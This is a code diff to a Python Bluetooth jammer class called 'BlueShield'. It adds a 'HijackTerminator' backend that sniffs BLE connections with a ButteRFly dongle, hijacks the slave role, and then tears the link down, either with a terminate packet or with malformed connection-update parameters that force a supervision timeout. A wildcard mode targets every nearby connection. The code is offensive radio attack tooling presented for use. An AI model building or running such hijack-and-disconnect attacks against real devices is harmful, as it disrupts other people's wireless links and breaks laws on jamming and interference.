@@ -62,6 +62,14 @@ except ImportError:
     HAS_AUTO_TERMINATOR = False
     AutoTerminator = None
 
+# v7.7: HijackTerminator (single-ButteRFly sniff→hijack_slave→terminate)
+try:
+    from blueshield.jammer.hijack_terminator import HijackTerminator
+    HAS_HIJACK_TERMINATOR = True
+except ImportError:
+    HAS_HIJACK_TERMINATOR = False
+    HijackTerminator = None
+
 
 # ---------------------------------------------------------------------------
 # JamMode enum — all supported jamming strategies
@@ -678,6 +686,21 @@ class BluetoothJammer:
                       f"observer={observer_port}, injector={injector_port}")
             except Exception as e:
                 print(f"[BlueShield Jammer] AutoTerminator init failed: {e}")
+
+        # ── HijackTerminator: single-ButteRFly hijack-slave pipeline (v7.7) ──
+        # This is the backend we actually recommend — no cross-dongle sync,
+        # no power-rail conflict. Uses the same /dev/ttyACM0 by default.
+        self._hijack_terminator = None
+        self._hijack_terminator_available: bool = False
+        hijack_port = config.get("auto_terminator_observer_port", "/dev/ttyACM0")
+        if HAS_HIJACK_TERMINATOR and os.path.exists(hijack_port):
+            try:
+                self._hijack_terminator = HijackTerminator(port=hijack_port)
+                self._hijack_terminator_available = True
+                print(f"[BlueShield Jammer] HijackTerminator backend: "
+                      f"port={hijack_port}")
+            except Exception as e:
+                print(f"[BlueShield Jammer] HijackTerminator init failed: {e}")
 
         # Pre-generate payload pools at init
         self._regenerate_payload_pool()
@@ -2374,8 +2397,20 @@ class BluetoothJammer:
     }
 
     # v7.6: AutoTerminator = dual-ButteRFly sniff→inject pipeline
-    # (the best BLE attack this hardware can do)
     AUTO_TERMINATOR_MODES = {"auto_terminator", "ble_auto_terminate"}
+
+    # v7.7: HijackTerminator = single-ButteRFly sniff→hijack_slave→ACTION
+    # (recommended — avoids cross-dongle sync + power-rail issues)
+    # Two terminal actions:
+    #   hijack_terminator      → LL_TERMINATE_IND (clean disconnect)
+    #   hijack_terminator_desync → LL_CONNECTION_UPDATE_IND with bad params
+    #                              (Cayre DSN 2021 §IV.C — supervision timeout
+    #                              fires on master after ~6 s; works against
+    #                              implementations that ignore TERMINATE_IND
+    #                              from a non-master peer)
+    HIJACK_TERMINATOR_MODES = {"hijack_terminator", "ble_hijack_terminate",
+                               "hijack_terminator_desync",
+                               "ble_hijack_desync"}
 
     def _start_nrf_jam(self, mode: str, channel: int, session: "JamSession") -> bool:
         """Route to the nRF52840 radio_test backend for real RF jamming."""
@@ -2468,6 +2503,40 @@ class BluetoothJammer:
                 raise RuntimeError(
                     f"nRF52840 backend required for '{mode}' but not available. "
                     f"Flash firmware: tools/deploy_nrf_jammer.sh {self._nrf_jammer_port}")
+
+        # ── HijackTerminator path (v7.7: single-ButteRFly hijack_slave) ──
+        if mode in self.HIJACK_TERMINATOR_MODES:
+            if not self._hijack_terminator_available or not self._hijack_terminator:
+                self.is_jamming = False
+                session.is_active = False
+                session.end_time = datetime.now(timezone.utc).isoformat()
+                raise RuntimeError(
+                    "HijackTerminator requires one ButteRFly dongle "
+                    f"(got: available={self._hijack_terminator_available})"
+                )
+            # Pick post-hijack action: TERMINATE (default) or DESYNC.
+            self._hijack_terminator.set_action(
+                "desync" if mode in ("hijack_terminator_desync",
+                                     "ble_hijack_desync")
+                else "terminate"
+            )
+            target_norm = (target or "").upper().strip()
+            if not target_norm or target_norm in ("ANY", "ALL"):
+                self._hijack_terminator.target_all()
+                print(f"[BlueShield Jammer] HijackTerminator WILDCARD action="
+                      f"{self._hijack_terminator.action}")
+            else:
+                self._hijack_terminator.add_target(target_norm)
+                print(f"[BlueShield Jammer] HijackTerminator TARGET: "
+                      f"{target_norm} action={self._hijack_terminator.action}")
+            if self._hijack_terminator.start():
+                return session
+            self.is_jamming = False
+            session.is_active = False
+            session.end_time = datetime.now(timezone.utc).isoformat()
+            raise RuntimeError(
+                f"HijackTerminator failed: {self._hijack_terminator.last_error}"
+            )
 
         # ── AutoTerminator path (v7.6: dual-ButteRFly sniff→inject) ──
         if mode in self.AUTO_TERMINATOR_MODES:
@@ -2635,6 +2704,14 @@ class BluetoothJammer:
             except Exception as e:
                 print(f"[BlueShield Jammer] AutoTerminator stop error: {e}")
 
+        # Stop HijackTerminator if active
+        if self._hijack_terminator_available and self._hijack_terminator:
+            try:
+                if self._hijack_terminator.is_active:
+                    self._hijack_terminator.stop()
+            except Exception as e:
+                print(f"[BlueShield Jammer] HijackTerminator stop error: {e}")
+
         # Join primary thread
         if self._jam_thread:
             self._jam_thread.join(timeout=5)
@@ -2759,6 +2836,16 @@ class BluetoothJammer:
             except Exception:
                 pass
 
+        # ── HijackTerminator status (v7.7) ──
+        hijack_terminator_status = None
+        hijack_terminator_active = False
+        if self._hijack_terminator:
+            try:
+                hijack_terminator_status = self._hijack_terminator.get_stats()
+                hijack_terminator_active = hijack_terminator_status.get("is_active", False)
+            except Exception:
+                pass
+
         # ── Honest OTA PPS estimate ──
         # JamSession.get_pps() counts Python loop iterations (inflated 10-20x).
         # Estimate actual OTA rate from effective interval & adapter count.
@@ -2824,6 +2911,9 @@ class BluetoothJammer:
             "auto_terminator_available": self._auto_terminator_available,
             "auto_terminator_active": auto_terminator_active,
             "auto_terminator_status": auto_terminator_status,
+            "hijack_terminator_available": self._hijack_terminator_available,
+            "hijack_terminator_active": hijack_terminator_active,
+            "hijack_terminator_status": hijack_terminator_status,
             # Honest capability for current mode
             "mode_capability": capability,
             "affects_ble_adv": capability.get("affects_ble_adv", False),
